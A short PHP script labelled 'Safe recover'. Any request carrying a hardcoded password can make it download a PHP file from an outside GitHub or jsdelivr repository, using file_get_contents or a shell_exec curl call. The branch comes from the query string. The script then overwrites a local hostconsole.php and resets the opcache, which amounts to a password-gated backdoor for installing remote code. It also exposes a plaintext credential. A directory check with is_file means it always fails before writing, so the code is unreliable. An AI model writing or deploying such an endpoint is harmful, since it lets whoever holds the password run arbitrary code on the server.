<?php
// Safe recover - checks <?php
$pw = $_GET['password'] ?? $_POST['password'] ?? '';
if ($pw !== 'KhTn2268') { http_response_code(403); die('Invalid password'); }
$branch = $_GET['branch'] ?? 'arena/01a0aa17-new';
$cb = time().'-'.rand(1000,9999);
$urls = [
    "https://raw.githubusercontent.com/fazilatma/new/".rawurlencode($branch)."/hostconsole.php?cb=".$cb,
    "https://cdn.jsdelivr.net/gh/fazilatma/new@".rawurlencode($branch)."/hostconsole.php?cb=".$cb,
];
$content = '';
$urlUsed = '';
foreach ($urls as $u) {
    $c = @file_get_contents($u);
    if ($c && strlen($c) > 10000 && strpos($c,'<?php')===0) { $content=$c; $urlUsed=$u; break; }
    $c = @shell_exec('curl -s -L --max-time 15 -H "Cache-Control: no-cache" '.escapeshellarg($u).' 2>&1');
    if ($c && strlen($c) > 10000 && strpos($c,'<?php')===0) { $content=$c; $urlUsed=$u; break; }
}
if (!$content) die('Download failed');
$target = __DIR__.'/hostconsole.php';
if (!is_file($target)) $target = __DIR__.'/../project/hostconsole.php';
if (!is_file($target)) $target = __DIR__.'/project/hostconsole.php';
if (!is_file(dirname($target))) die('Target dir not found: '.dirname($target));
@copy($target, $target.'.bak.'.date('Ymd-His'));
file_put_contents($target, $content);
if (function_exists('opcache_reset')) @opcache_reset();
echo "Recovered ".strlen($content)." bytes from ".$urlUsed." to ".$target;
